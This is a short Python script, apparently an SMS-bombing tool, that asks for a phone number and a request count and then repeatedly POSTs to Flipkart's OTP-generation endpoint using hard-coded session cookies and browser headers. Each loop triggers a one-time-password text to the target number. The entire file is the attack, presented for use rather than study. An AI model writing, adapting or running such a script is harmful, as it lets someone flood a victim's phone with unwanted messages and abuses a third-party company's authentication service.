#atomating requests to flipcart api
#author : Samartha
import requests
pn=input('Enter phone number : ')
cc='91'
cookies = {
'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050',
'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
'lux_uid': '155867904381892986',
'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI',
's_cc': 'true',
'SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078',
'gpv_pn': 'HomePage',
'gpv_pn_t': 'Homepage',
'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
's_sq': '%5B%5BB%5D%5D'}

headers = {
    'Host': 'www.flipkart.com',
    'Connection': 'keep-alive',
    'Content-Length': '60',
    'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
    'Origin': 'https://www.flipkart.com',
    'Save-Data': 'on',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Referer': 'https://www.flipkart.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'
}
data = {
  'loginId': '+'+cc+pn,
  'state': 'VERIFIED',
  'churnEmailRequest': 'false'
}

n=int(input('no of requests :'))
for i in range(n):
    response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
    print('msg sent :',i)
